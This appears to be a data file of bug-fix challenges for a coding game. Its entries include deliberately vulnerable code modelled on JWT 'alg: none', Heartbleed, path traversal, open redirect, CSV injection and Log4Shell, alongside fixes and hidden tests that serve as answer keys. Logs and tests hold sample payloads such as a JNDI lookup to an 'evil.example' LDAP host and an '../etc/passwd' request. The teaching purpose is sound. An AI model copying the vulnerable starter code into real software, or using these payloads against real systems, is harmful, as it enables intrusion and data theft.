/** Wave 7 — security & validation bugs inspired by famous vulnerabilities. */
import type { BugSpec } from "./bugs-data.js";

export const WAVE7: BugSpec[] = [

  {
    title: "alg: none",
    difficulty: "medium",
    category: "backend",
    language: "python",
    tags: ["Security", "JWT"],
    description: `Inspired by the 2015 JWT library vulnerabilities: tokens declaring \`"alg": "none"\` were accepted **without any signature at all** — attackers could mint themselves any identity by just… asking nicely.

\`verify.py\` decides whether a decoded token is trustworthy.`,
    bugReport: `**BUG-ALG-NONE** · Priority: Critical (auth bypass) · Reported by: security

is_trusted(header, signature_ok):
- ONLY tokens with alg == "HS256" AND a valid signature are trusted
- "none", "NONE", missing alg — never trusted, signature or not

Observed: a curl with {"alg":"none"} and no signature returns admin data.`,
    logs: `[auth] token alg=none sig=<absent> -> TRUSTED (?!)`,
    files: [
      {
        filePath: "src/auth/verify.py",
        isEditable: true,
        language: "python",
        content: `# Decides whether a decoded JWT can be trusted.

ALLOWED_ALG = "HS256"

def is_trusted(header, signature_ok):
    alg = header.get("alg")
    if alg == "none":
        return True
    return signature_ok
`,
      },
    ],
    tests: [
      {
        name: "a properly signed HS256 token is trusted",
        isHidden: false,
        source: `m = bug_require("src/auth/verify")
assert_.ok(m.is_trusted({"alg": "HS256"}, True))`,
      },
      {
        name: "alg none is never trusted",
        isHidden: false,
        source: `m = bug_require("src/auth/verify")
assert_.ok(not m.is_trusted({"alg": "none"}, False), "the classic bypass")
assert_.ok(not m.is_trusted({"alg": "none"}, True))`,
      },
      {
        name: "a bad signature is never trusted",
        isHidden: false,
        source: `m = bug_require("src/auth/verify")
assert_.ok(not m.is_trusted({"alg": "HS256"}, False))`,
      },
      {
        name: "unknown or missing algorithms are rejected",
        isHidden: true,
        source: `m = bug_require("src/auth/verify")
assert_.ok(not m.is_trusted({"alg": "HS512"}, True))
assert_.ok(not m.is_trusted({}, True))`,
      },
    ],
    fixedFiles: {
      "src/auth/verify.py": `# Decides whether a decoded JWT can be trusted.

ALLOWED_ALG = "HS256"

def is_trusted(header, signature_ok):
    alg = header.get("alg")
    return alg == ALLOWED_ALG and signature_ok
`,
    },
  },

  {
    title: "The Wrong Audience",
    difficulty: "medium",
    category: "backend",
    language: "javascript",
    tags: ["Security", "JWT"],
    description: `Inspired by the cross-service token confusion behind several real IdP advisories: a token minted for the *analytics* API is happily accepted by the *payments* API, because nobody checks the \`aud\` claim. Same issuer, wrong audience, full access.

\`claims.js\` validates a decoded token's claims.`,
    bugReport: `**BUG-AUD** · Priority: Critical · Reported by: security review

validateClaims(claims, expected, nowSeconds):
- claims.iss must equal expected.issuer
- claims.aud must equal expected.audience   <- the missing check
- claims.exp must be strictly in the future

Observed: any token from our issuer opens every service.`,
    logs: `[payments] accepted token aud="analytics-api" (we are payments-api)`,
    files: [
      {
        filePath: "src/auth/claims.js",
        isEditable: true,
        language: "javascript",
        content: `// Validates decoded token claims.
exports.validateClaims = function (claims, expected, nowSeconds) {
  if (claims.iss !== expected.issuer) return false;
  return true;
};
`,
      },
    ],
    tests: [
      {
        name: "a fully matching token passes",
        isHidden: false,
        source: `var v = require("src/auth/claims").validateClaims;
assert.ok(v(
  { iss: "https://id.corp", aud: "payments-api", exp: 2000 },
  { issuer: "https://id.corp", audience: "payments-api" },
  1000
));`,
      },
      {
        name: "the wrong audience is rejected",
        isHidden: false,
        source: `var v = require("src/auth/claims").validateClaims;
assert.ok(!v(
  { iss: "https://id.corp", aud: "analytics-api", exp: 2000 },
  { issuer: "https://id.corp", audience: "payments-api" },
  1000
), "cross-service token must fail");`,
      },
      {
        name: "expired tokens are rejected",
        isHidden: false,
        source: `var v = require("src/auth/claims").validateClaims;
assert.ok(!v(
  { iss: "https://id.corp", aud: "payments-api", exp: 900 },
  { issuer: "https://id.corp", audience: "payments-api" },
  1000
));`,
      },
      {
        name: "the wrong issuer still fails",
        isHidden: true,
        source: `var v = require("src/auth/claims").validateClaims;
assert.ok(!v(
  { iss: "https://evil.example", aud: "payments-api", exp: 2000 },
  { issuer: "https://id.corp", audience: "payments-api" },
  1000
));`,
      },
    ],
    fixedFiles: {
      "src/auth/claims.js": `// Validates decoded token claims.
exports.validateClaims = function (claims, expected, nowSeconds) {
  if (claims.iss !== expected.issuer) return false;
  if (claims.aud !== expected.audience) return false;
  if (!(claims.exp > nowSeconds)) return false;
  return true;
};
`,
    },
  },

  {
    title: "Heartbleed's Little Cousin",
    difficulty: "hard",
    category: "backend",
    language: "javascript",
    tags: ["Security", "Bounds"],
    description: `Inspired by Heartbleed (2014): a heartbeat request says "echo 4 bytes back — no wait, echo 64,000" — and the server obliges, reading past the payload into memory holding private keys.

The echo service (locked memory region included) must never return more bytes than the client actually **sent**.`,
    bugReport: `**BUG-HB** · Priority: Existential · Reported by: security

echo(payload, claimedLength):
- return AT MOST payload.length bytes of the payload
- the claimed length is untrusted client input

Observed: over-claimed lengths return the payload PLUS whatever sits next to
it in the buffer — including the region marked SECRET.`,
    logs: `[tls] heartbeat req len=4 claimed=64 -> response contains "SECRET_MASTER_KEY"`,
    files: [
      {
        filePath: "src/tls/memoryRegion.js",
        isEditable: false,
        language: "javascript",
        content: `// Simulated process memory adjacent to the request buffer. DO NOT EDIT.
exports.ADJACENT_MEMORY = "SECRET_MASTER_KEY_0xDEADBEEF_SESSION_TOKENS";
`,
      },
      {
        filePath: "src/tls/heartbeat.js",
        isEditable: true,
        language: "javascript",
        content: `var memory = require("./memoryRegion");

// Echoes the heartbeat payload back to the client.
exports.echo = function (payload, claimedLength) {
  var buffer = payload + memory.ADJACENT_MEMORY;
  return buffer.slice(0, claimedLength);
};
`,
      },
    ],
    tests: [
      {
        name: "honest requests echo exactly",
        isHidden: false,
        source: `var echo = require("src/tls/heartbeat").echo;
assert.equal(echo("ping", 4), "ping");`,
      },
      {
        name: "over-claimed lengths leak nothing",
        isHidden: false,
        source: `var echo = require("src/tls/heartbeat").echo;
var out = echo("bird", 64);
assert.equal(out, "bird", "only what was sent");
assert.ok(out.indexOf("SECRET") === -1, "no adjacent memory!");`,
      },
      {
        name: "shorter claims truncate normally",
        isHidden: false,
        source: `var echo = require("src/tls/heartbeat").echo;
assert.equal(echo("hello", 2), "he");`,
      },
      {
        name: "zero and empty are safe",
        isHidden: true,
        source: `var echo = require("src/tls/heartbeat").echo;
assert.equal(echo("x", 0), "");
assert.equal(echo("", 1000), "");`,
      },
    ],
    fixedFiles: {
      "src/tls/heartbeat.js": `var memory = require("./memoryRegion");

// Echoes the heartbeat payload back to the client.
exports.echo = function (payload, claimedLength) {
  var length = Math.min(claimedLength, payload.length);
  return payload.slice(0, length);
};
`,
    },
  },

  {
    title: "The Path That Climbed Out",
    difficulty: "medium",
    category: "backend",
    language: "python",
    tags: ["Security", "Path Traversal"],
    description: `Inspired by the vulnerability class that never dies — from web servers in the 90s to container escapes today: a filename with \`../\` in it walks straight out of the sandbox and reads \`/etc/passwd\`.

\`filestore.py\` joins user-supplied paths onto a base directory. It must refuse to climb.`,
    bugReport: `**BUG-DOTDOT** · Priority: Critical · Reported by: bug bounty

safe_join(base, user_path):
- reject absolute paths and any ".." segment -> raise ValueError
- otherwise return base + "/" + normalized path ("." segments dropped)

Observed: GET /files/..%2F..%2Fetc%2Fpasswd returns the real thing.`,
    logs: `[files] serving "uploads/../../etc/passwd"`,
    files: [
      {
        filePath: "src/fs/filestore.py",
        isEditable: true,
        language: "python",
        content: `# Joins a user-supplied path onto the storage root.

def safe_join(base, user_path):
    return base + "/" + user_path
`,
      },
    ],
    tests: [
      {
        name: "ordinary paths join under the base",
        isHidden: false,
        source: `m = bug_require("src/fs/filestore")
assert_.equal(m.safe_join("uploads", "photos/cat.jpg"), "uploads/photos/cat.jpg")`,
      },
      {
        name: "dot-dot segments are rejected",
        isHidden: false,
        source: `m = bug_require("src/fs/filestore")
assert_.throws(lambda: m.safe_join("uploads", "../etc/passwd"))
assert_.throws(lambda: m.safe_join("uploads", "a/../../secrets.txt"))`,
      },
      {
        name: "absolute paths are rejected",
        isHidden: false,
        source: `m = bug_require("src/fs/filestore")
assert_.throws(lambda: m.safe_join("uploads", "/etc/passwd"))`,
      },
      {
        name: "single dots are harmless and dropped",
        isHidden: true,
        source: `m = bug_require("src/fs/filestore")
assert_.equal(m.safe_join("uploads", "./docs/./a.txt"), "uploads/docs/a.txt")`,
      },
    ],
    fixedFiles: {
      "src/fs/filestore.py": `# Joins a user-supplied path onto the storage root.

def safe_join(base, user_path):
    if user_path.startswith("/"):
        raise ValueError("absolute paths are not allowed")
    parts = []
    for seg in user_path.split("/"):
        if seg == "" or seg == ".":
            continue
        if seg == "..":
            raise ValueError("path traversal detected")
        parts.append(seg)
    return base + "/" + "/".join(parts)
`,
    },
  },

  {
    title: "The Open Redirect",
    difficulty: "medium",
    category: "backend",
    language: "javascript",
    tags: ["Security", "URLs"],
    description: `Inspired by the open-redirect advisories filed against practically every login page ever built. The "is this URL ours?" check uses \`indexOf\` — so \`https://evil.example/?next=https://good.com\` passes because the good host appears *somewhere* in the string.

\`redirects.js\` picks the post-login destination.`,
    bugReport: `**BUG-302** · Priority: High (phishing vector) · Reported by: bug bounty

safeRedirect(url, allowedHosts) -> the url if safe, else "/":
- allowed: same-site relative paths ("/dashboard") — but NOT "//host" tricks
- allowed: "https://<host>" or "https://<host>/..." for hosts in the list
- everything else -> "/"

Observed: attacker URLs containing our hostname anywhere sail through.`,
    logs: `[login] redirect -> https://evil.example/phish?brand=good.com (allowed?!)`,
    files: [
      {
        filePath: "src/web/redirects.js",
        isEditable: true,
        language: "javascript",
        content: `// Chooses the post-login redirect target.
exports.safeRedirect = function (url, allowedHosts) {
  for (var i = 0; i < allowedHosts.length; i++) {
    if (url.indexOf(allowedHosts[i]) !== -1) {
      return url;
    }
  }
  return "/";
};
`,
      },
    ],
    tests: [
      {
        name: "our own absolute urls pass",
        isHidden: false,
        source: `var safe = require("src/web/redirects").safeRedirect;
assert.equal(safe("https://good.com/dash", ["good.com"]), "https://good.com/dash");
assert.equal(safe("https://good.com", ["good.com"]), "https://good.com");`,
      },
      {
        name: "a foreign url mentioning our host is blocked",
        isHidden: false,
        source: `var safe = require("src/web/redirects").safeRedirect;
assert.equal(safe("https://evil.example/?next=https://good.com", ["good.com"]), "/");
assert.equal(safe("https://good.com.evil.example/", ["good.com"]), "/");`,
      },
      {
        name: "relative paths pass, protocol-relative tricks do not",
        isHidden: false,
        source: `var safe = require("src/web/redirects").safeRedirect;
assert.equal(safe("/dashboard", ["good.com"]), "/dashboard");
assert.equal(safe("//evil.example/x", ["good.com"]), "/");`,
      },
      {
        name: "unlisted hosts and plain http are blocked",
        isHidden: true,
        source: `var safe = require("src/web/redirects").safeRedirect;
assert.equal(safe("https://other.com/x", ["good.com"]), "/");
assert.equal(safe("http://good.com/x", ["good.com"]), "/");`,
      },
    ],
    fixedFiles: {
      "src/web/redirects.js": `// Chooses the post-login redirect target.
exports.safeRedirect = function (url, allowedHosts) {
  if (url.charAt(0) === "/" && url.charAt(1) !== "/") {
    return url;
  }
  for (var i = 0; i < allowedHosts.length; i++) {
    var origin = "https://" + allowedHosts[i];
    if (url === origin || url.indexOf(origin + "/") === 0) {
      return url;
    }
  }
  return "/";
};
`,
    },
  },

  {
    title: "The Lookalike Domain",
    difficulty: "hard",
    category: "backend",
    language: "python",
    tags: ["Security", "Unicode"],
    description: `Inspired by IDN homograph attacks: register \`pаypal.com\` — with a **Cyrillic а** — and to human eyes it's indistinguishable from the real thing. Detection maps confusable characters to a "skeleton" and compares those.

The confusables table is locked. \`spoofcheck.py\` isn't using it.`,
    bugReport: `**BUG-HOMOGLYPH** · Priority: High (phishing) · Reported by: trust & safety

is_spoof(candidate, trusted):
- True iff skeleton(candidate) == skeleton(trusted) AND candidate != trusted
- the trusted domain itself is NOT a spoof of itself

Observed: the Cyrillic clone passes clean, and — worse — the check currently
flags the REAL domain as a spoof of itself.`,
    logs: `[registrar] "pаypal.com" (U+0430) cleared for registration
[alerts] "paypal.com" flagged as spoofing "paypal.com" (?!)`,
    files: [
      {
        filePath: "src/sec/confusables.py",
        isEditable: false,
        language: "python",
        content: `# Cyrillic -> Latin confusable skeleton map (excerpt). DO NOT EDIT.
SKELETON = {
    "а": "a",
    "е": "e",
    "о": "o",
    "р": "p",
    "с": "c",
    "х": "x",
    "у": "y",
}
`,
      },
      {
        filePath: "src/sec/spoofcheck.py",
        isEditable: true,
        language: "python",
        content: `confusables = bug_require("./confusables")

def is_spoof(candidate, trusted):
    return candidate.lower() == trusted.lower()
`,
      },
    ],
    tests: [
      {
        name: "the cyrillic clone is flagged",
        isHidden: false,
        source: `m = bug_require("src/sec/spoofcheck")
assert_.ok(m.is_spoof("pаypal.com", "paypal.com"), "U+0430 lookalike must be caught")`,
      },
      {
        name: "the real domain is not a spoof of itself",
        isHidden: false,
        source: `m = bug_require("src/sec/spoofcheck")
assert_.ok(not m.is_spoof("paypal.com", "paypal.com"))`,
      },
      {
        name: "genuinely different domains are fine",
        isHidden: false,
        source: `m = bug_require("src/sec/spoofcheck")
assert_.ok(not m.is_spoof("example.com", "paypal.com"))`,
      },
      {
        name: "mixed confusables are still caught",
        isHidden: true,
        source: `m = bug_require("src/sec/spoofcheck")
assert_.ok(m.is_spoof("gооgle.com", "google.com"), "double Cyrillic о")
assert_.ok(not m.is_spoof("goggle.com", "google.com"))`,
      },
    ],
    fixedFiles: {
      "src/sec/spoofcheck.py": `confusables = bug_require("./confusables")

def _skeleton(domain):
    out = []
    for ch in domain.lower():
        out.append(confusables.SKELETON.get(ch, ch))
    return "".join(out)

def is_spoof(candidate, trusted):
    if candidate == trusted:
        return False
    return _skeleton(candidate) == _skeleton(trusted)
`,
    },
  },

  {
    title: "The Spreadsheet That Ran Code",
    difficulty: "easy",
    category: "backend",
    language: "javascript",
    tags: ["Injection", "CSV"],
    description: `Inspired by CSV-injection advisories against every export button on the internet: a user names themselves \`=HYPERLINK(...)\` and whoever opens the exported spreadsheet executes it. Cells starting with \`=\`, \`+\`, \`-\` or \`@\` must be neutralised with a leading apostrophe.

\`csvExport.js\` writes cells raw.`,
    bugReport: `**BUG-CSV-INJ** · Priority: High · Reported by: security

csvCell(value):
- if the value starts with =, +, - or @, prefix a single quote (')
- double every embedded double-quote and wrap in double-quotes if the value
  contains a comma, quote or newline

Observed: exported member lists execute formulas in Excel.`,
    logs: `[export] cell: =HYPERLINK("http://evil","click") -> executed on open`,
    files: [
      {
        filePath: "src/export/csvExport.js",
        isEditable: true,
        language: "javascript",
        content: `// Renders one CSV cell.
exports.csvCell = function (value) {
  return value;
};
`,
      },
    ],
    tests: [
      {
        name: "formula starters are neutralised",
        isHidden: false,
        source: `var cell = require("src/export/csvExport").csvCell;
assert.equal(cell("=SUM(A1:A9)"), "'=SUM(A1:A9)");
assert.equal(cell("@import"), "'@import");`,
      },
      {
        name: "plain values pass through",
        isHidden: false,
        source: `var cell = require("src/export/csvExport").csvCell;
assert.equal(cell("Ada Lovelace"), "Ada Lovelace");`,
      },
      {
        name: "commas and quotes are escaped",
        isHidden: false,
        source: `var cell = require("src/export/csvExport").csvCell;
assert.equal(cell('Doe, John "JD"'), '"Doe, John ""JD"""');`,
      },
      {
        name: "plus and minus starters are covered",
        isHidden: true,
        source: `var cell = require("src/export/csvExport").csvCell;
assert.equal(cell("+1234"), "'+1234");
assert.equal(cell("-2+3"), "'-2+3");`,
      },
    ],
    fixedFiles: {
      "src/export/csvExport.js": `// Renders one CSV cell.
exports.csvCell = function (value) {
  var out = value;
  if (/^[=+\\-@]/.test(out)) {
    out = "'" + out;
  }
  if (out.indexOf(",") !== -1 || out.indexOf('"') !== -1 || out.indexOf("\\n") !== -1) {
    out = '"' + out.replace(/"/g, '""') + '"';
  }
  return out;
};
`,
    },
  },

  {
    title: "The Log That Looked Things Up",
    difficulty: "hard",
    category: "backend",
    language: "java",
    tags: ["Injection", "Logging"],
    description: `Inspired by Log4Shell (2021), the vulnerability that ruined a global December: log a user-controlled string containing \`\${jndi:…}\` and the logging framework *resolves it* — downloading and executing attacker code.

The resolver is locked (that's the framework). \`LogFormatter.java\` must make sure user input **never reaches it**.`,
    bugReport: `**BUG-44228** · Priority: 10.0/10.0 · Reported by: the entire industry

format(userMessage):
- user input is DATA. Never resolve lookups found inside it.
- neutralise every "\${" as "{" so downstream systems can't resolve it either
- the output must never contain the resolver's output

Observed: a chat message of \${jndi:ldap://evil/x} triggers a lookup.`,
    logs: `[chat] user nickname: \${jndi:ldap://evil.example/a}
[log4j] resolving jndi lookup...`,
    files: [
      {
        filePath: "Resolver.java",
        isEditable: false,
        language: "java",
        content: `// The framework's lookup engine — powerful and dangerous. DO NOT EDIT.
class Resolver {
    static String resolve(String expression) {
        return "RESOLVED:" + expression;
    }
}`,
      },
      {
        filePath: "LogFormatter.java",
        isEditable: true,
        language: "java",
        content: `class LogFormatter {
    static String format(String userMessage) {
        int start = userMessage.indexOf("\${");
        if (start != -1) {
            int end = userMessage.indexOf("}", start);
            if (end != -1) {
                String expr = userMessage.substring(start + 2, end);
                String resolved = Resolver.resolve(expr);
                return userMessage.substring(0, start) + resolved + userMessage.substring(end + 1);
            }
        }
        return userMessage;
    }
}`,
      },
    ],
    tests: [
      {
        name: "lookup syntax is neutralised, never resolved",
        isHidden: false,
        source: `                String out = LogFormatter.format("Hello \${jndi:ldap://evil/x}");
                BugAssert.ok(!out.contains("RESOLVED"), "user input must never hit the resolver");
                BugAssert.equal(out, "Hello {jndi:ldap://evil/x}");`,
      },
      {
        name: "plain messages pass through untouched",
        isHidden: false,
        source: `                BugAssert.equal(LogFormatter.format("deploy finished in 32s"), "deploy finished in 32s");`,
      },
      {
        name: "multiple lookups are all neutralised",
        isHidden: true,
        source: `                String out = LogFormatter.format("\${a}\${b} and \${env:HOME}");
                BugAssert.ok(!out.contains("RESOLVED"));
                BugAssert.equal(out, "{a}{b} and {env:HOME}");`,
      },
    ],
    fixedFiles: {
      "LogFormatter.java": `class LogFormatter {
    static String format(String userMessage) {
        return userMessage.replace("\${", "{");
    }
}`,
    },
  },

  {
    title: "The Regex That Trusted Email",
    difficulty: "easy",
    category: "backend",
    language: "javascript",
    tags: ["Validation", "Regex"],
    description: `Inspired by the bounce storms behind every "we emailed you a receipt" pipeline: the validator is \`/.+@.+/\`, so \`a@b@c\`, \`"has spaces"@x\` and domains without a dot all get queued, bounce, and tank the sender reputation.

Tighten \`emailCheck.js\` to the sane subset.`,
    bugReport: `**BUG-MX** · Reported by: deliverability

isValid(email) — pragmatic rules:
- exactly one "@", no whitespace anywhere
- local part non-empty
- domain contains at least one ".", with a TLD of 2+ letters

Observed: 12% of the queue is structurally impossible addresses.`,
    logs: `[smtp] 550 loop detected for "ceo@corp@corp"`,
    files: [
      {
        filePath: "src/mail/emailCheck.js",
        isEditable: true,
        language: "javascript",
        content: `// Structural email validation.
exports.isValid = function (email) {
  return /.+@.+/.test(email);
};
`,
      },
    ],
    tests: [
      {
        name: "normal addresses pass",
        isHidden: false,
        source: `var v = require("src/mail/emailCheck").isValid;
assert.ok(v("ada@lovelace.dev"));
assert.ok(v("sales+tag@shop.co.uk"));`,
      },
      {
        name: "double @ and spaces fail",
        isHidden: false,
        source: `var v = require("src/mail/emailCheck").isValid;
assert.ok(!v("a@b@c.com"));
assert.ok(!v("has space@x.com"));`,
      },
      {
        name: "dotless domains and short TLDs fail",
        isHidden: false,
        source: `var v = require("src/mail/emailCheck").isValid;
assert.ok(!v("root@localhost"));
assert.ok(!v("x@y.z"));`,
      },
      {
        name: "empty locals and edges fail",
        isHidden: true,
        source: `var v = require("src/mail/emailCheck").isValid;
assert.ok(!v("@x.com"));
assert.ok(!v("a@.com"));
assert.ok(v("a@b.io"));`,
      },
    ],
    fixedFiles: {
      "src/mail/emailCheck.js": `// Structural email validation.
exports.isValid = function (email) {
  return /^[^\\s@]+@[^\\s@]+\\.[A-Za-z]{2,}$/.test(email);
};
`,
    },
  },

  {
    title: "Rounded Out of a Refund",
    difficulty: "medium",
    category: "backend",
    language: "python",
    tags: ["Rounding", "Money"],
    description: `Inspired by the invoicing disputes born from Python's own \`round()\` — it's **banker's rounding**: \`round(2.5)\` is 2, \`round(3.5)\` is 4. Finance signed off on classic *half-up* ("half away from zero"). The refunds engine uses the built-in.

\`rounding.py\` — implement true half-up.`,
    bugReport: `**BUG-HALFUP** · Priority: High · Reported by: billing disputes

half_up(x) — round half AWAY from zero:
- 2.5 -> 3, 3.5 -> 4, 2.4 -> 2
- -2.5 -> -3

Observed: round(2.5) == 2 shaved cents off exactly-half refunds; the ombudsman
letter cites 40,000 affected invoices.`,
    logs: `[refund] 2.5 -> 2 (customer expected 3)`,
    files: [
      {
        filePath: "src/fin/rounding.py",
        isEditable: true,
        language: "python",
        content: `# Rounds to the nearest whole unit, halves away from zero.

def half_up(x):
    return round(x)
`,
      },
    ],
    tests: [
      {
        name: "positive halves round up",
        isHidden: false,
        source: `m = bug_require("src/fin/rounding")
assert_.equal(m.half_up(2.5), 3)
assert_.equal(m.half_up(3.5), 4)`,
      },
      {
        name: "non-halves round normally",
        isHidden: false,
        source: `m = bug_require("src/fin/rounding")
assert_.equal(m.half_up(2.4), 2)
assert_.equal(m.half_up(2.6), 3)`,
      },
      {
        name: "negative halves round away from zero",
        isHidden: true,
        source: `m = bug_require("src/fin/rounding")
assert_.equal(m.half_up(-2.5), -3)
assert_.equal(m.half_up(-2.4), -2)`,
      },
    ],
    fixedFiles: {
      "src/fin/rounding.py": `import math

# Rounds to the nearest whole unit, halves away from zero.

def half_up(x):
    if x >= 0:
        return int(math.floor(x + 0.5))
    return int(math.ceil(x - 0.5))
`,
    },
  },

  {
    title: "The Tip That Didn't Add Up",
    difficulty: "medium",
    category: "backend",
    language: "javascript",
    tags: ["Rounding", "Money"],
    description: `Inspired by the gig-economy payout scandals over vanishing cents: split a \$1.00 tip among 3 drivers with \`floor(total/n)\` and one cent simply evaporates — times millions of orders.

\`split.js\` must conserve every cent: parts differ by at most one, extra cents go to the earliest parts, and the sum is exact.`,
    bugReport: `**BUG-1CENT-TIP** · Priority: High (press risk) · Reported by: payouts

splitEvenly(totalCents, n):
- returns n integers summing EXACTLY to totalCents
- parts differ by at most 1; earlier parts get the extra cents

Observed: splitEvenly(100, 3) -> [33, 33, 33]. One cent gone, every order.`,
    logs: `[payout] reconciliation: -$8,214.66 this quarter in vanished remainders`,
    files: [
      {
        filePath: "src/pay/split.js",
        isEditable: true,
        language: "javascript",
        content: `// Splits a tip evenly across n recipients.
exports.splitEvenly = function (totalCents, n) {
  var each = Math.floor(totalCents / n);
  var out = [];
  for (var i = 0; i < n; i++) {
    out.push(each);
  }
  return out;
};
`,
      },
    ],
    tests: [
      {
        name: "the classic dollar-three-ways case conserves the cent",
        isHidden: false,
        source: `var split = require("src/pay/split").splitEvenly;
assert.equal(split(100, 3), [34, 33, 33]);`,
      },
      {
        name: "the sum is always exact",
        isHidden: false,
        source: `var split = require("src/pay/split").splitEvenly;
var parts = split(999, 4);
assert.equal(parts.reduce(function (a, b) { return a + b; }, 0), 999);
assert.equal(parts, [250, 250, 250, 249]);`,
      },
      {
        name: "even divisions stay even",
        isHidden: false,
        source: `var split = require("src/pay/split").splitEvenly;
assert.equal(split(300, 3), [100, 100, 100]);`,
      },
      {
        name: "tiny totals distribute fairly",
        isHidden: true,
        source: `var split = require("src/pay/split").splitEvenly;
assert.equal(split(2, 3), [1, 1, 0]);
assert.equal(split(0, 2), [0, 0]);`,
      },
    ],
    fixedFiles: {
      "src/pay/split.js": `// Splits a tip evenly across n recipients.
exports.splitEvenly = function (totalCents, n) {
  var each = Math.floor(totalCents / n);
  var remainder = totalCents - each * n;
  var out = [];
  for (var i = 0; i < n; i++) {
    out.push(i < remainder ? each + 1 : each);
  }
  return out;
};
`,
    },
  },

  {
    title: "The 37th of March",
    difficulty: "easy",
    category: "backend",
    language: "java",
    tags: ["Validation", "Dates"],
    description: `Inspired by Java's own \`java.util.Calendar\` in lenient mode — the API that happily turns "March 37th" into April 6th. Wonderful for math, catastrophic for validating user input: typos silently become different dates on legal documents.

\`DateInput.java\` must reject impossible dates, not "fix" them.`,
    bugReport: `**BUG-LENIENT** · Priority: High (compliance) · Reported by: legal ops

validate(year, month, day) -> int[]{y,m,d} or IllegalArgumentException:
- month 1..12, day 1..(length of that month, leap-aware)
- NO rollover. 2024-03-37 is an error, not April 6th.

Observed: contract dates typed with fat fingers silently shift by days.`,
    logs: `[contracts] entered 2024-03-37, stored 2024-04-06`,
    files: [
      {
        filePath: "DateInput.java",
        isEditable: true,
        language: "java",
        content: `class DateInput {
    static final int[] DAYS = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 };

    static boolean isLeap(int year) {
        return year % 4 == 0 && (year % 100 != 0 || year % 400 == 0);
    }

    static int[] validate(int year, int month, int day) {
        while (month > 12) {
            month -= 12;
            year++;
        }
        int len = DAYS[month - 1];
        while (day > len) {
            day -= len;
            month++;
            if (month > 12) { month = 1; year++; }
            len = DAYS[month - 1];
        }
        return new int[] { year, month, day };
    }
}`,
      },
    ],
    tests: [
      {
        name: "valid dates pass through",
        isHidden: false,
        source: `                BugAssert.equal(DateInput.validate(2024, 7, 15), new int[] { 2024, 7, 15 });`,
      },
      {
        name: "impossible days are rejected, not rolled",
        isHidden: false,
        source: `                boolean threw = false;
                try { DateInput.validate(2024, 3, 37); } catch (IllegalArgumentException e) { threw = true; }
                BugAssert.ok(threw, "March 37th must be an error");`,
      },
      {
        name: "leap day is valid only in leap years",
        isHidden: false,
        source: `                BugAssert.equal(DateInput.validate(2024, 2, 29), new int[] { 2024, 2, 29 });
                boolean threw = false;
                try { DateInput.validate(2023, 2, 29); } catch (IllegalArgumentException e) { threw = true; }
                BugAssert.ok(threw);`,
      },
      {
        name: "month bounds are enforced",
        isHidden: true,
        source: `                boolean threw = false;
                try { DateInput.validate(2024, 13, 1); } catch (IllegalArgumentException e) { threw = true; }
                BugAssert.ok(threw);
                boolean threw2 = false;
                try { DateInput.validate(2024, 4, 0); } catch (IllegalArgumentException e) { threw2 = true; }
                BugAssert.ok(threw2);`,
      },
    ],
    fixedFiles: {
      "DateInput.java": `class DateInput {
    static final int[] DAYS = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 };

    static boolean isLeap(int year) {
        return year % 4 == 0 && (year % 100 != 0 || year % 400 == 0);
    }

    static int[] validate(int year, int month, int day) {
        if (month < 1 || month > 12) {
            throw new IllegalArgumentException("invalid month: " + month);
        }
        int len = DAYS[month - 1];
        if (month == 2 && isLeap(year)) {
            len = 29;
        }
        if (day < 1 || day > len) {
            throw new IllegalArgumentException("invalid day: " + day);
        }
        return new int[] { year, month, day };
    }
}`,
    },
  },

  {
    title: "Default Country Roulette",
    difficulty: "medium",
    category: "backend",
    language: "python",
    tags: ["Parsing", "Phones"],
    description: `Inspired by the SMS-delivery mysteries every messaging integration debugs eventually: a UK number arrives as \`+44 20 7946 0958\`, the normaliser slaps the default \`+1\` in front anyway, and the OTP heads to a very confused landline in Kansas.

\`phone.py\` normalises to E.164.`,
    bugReport: `**BUG-E164** · Priority: High · Reported by: OTP delivery

normalize(raw, default_cc="+1"):
- strip spaces, dashes, dots and parentheses
- already starts with "+"  -> keep its country code
- starts with "00"          -> replace the 00 with "+"
- bare national number      -> prefix default_cc
- anything with letters/other symbols -> raise ValueError

Observed: every already-international number gets ANOTHER country code.`,
    logs: `[sms] normalize("+44 20 7946 0958") -> "+1+442079460958" -> undeliverable`,
    files: [
      {
        filePath: "src/sms/phone.py",
        isEditable: true,
        language: "python",
        content: `# Normalises phone numbers to E.164.

def normalize(raw, default_cc="+1"):
    cleaned = raw.replace(" ", "").replace("-", "").replace("(", "").replace(")", "").replace(".", "")
    return default_cc + cleaned
`,
      },
    ],
    tests: [
      {
        name: "international numbers keep their code",
        isHidden: false,
        source: `m = bug_require("src/sms/phone")
assert_.equal(m.normalize("+44 20 7946 0958"), "+442079460958")`,
      },
      {
        name: "national numbers get the default code",
        isHidden: false,
        source: `m = bug_require("src/sms/phone")
assert_.equal(m.normalize("(415) 555-2671"), "+14155552671")`,
      },
      {
        name: "double-zero prefixes convert to plus",
        isHidden: false,
        source: `m = bug_require("src/sms/phone")
assert_.equal(m.normalize("0049 30 901820"), "+4930901820")`,
      },
      {
        name: "garbage raises instead of guessing",
        isHidden: true,
        source: `m = bug_require("src/sms/phone")
assert_.throws(lambda: m.normalize("call me maybe"))
assert_.equal(m.normalize("415.555.2671"), "+14155552671")`,
      },
    ],
    fixedFiles: {
      "src/sms/phone.py": `# Normalises phone numbers to E.164.

def normalize(raw, default_cc="+1"):
    cleaned = raw.replace(" ", "").replace("-", "").replace("(", "").replace(")", "").replace(".", "")
    if cleaned.startswith("+"):
        body = cleaned[1:]
        prefix = "+"
    elif cleaned.startswith("00"):
        body = cleaned[2:]
        prefix = "+"
    else:
        body = cleaned
        prefix = default_cc
    if not body.isdigit() or len(body) == 0:
        raise ValueError("not a phone number: " + raw)
    return prefix + body
`,
    },
  },

];
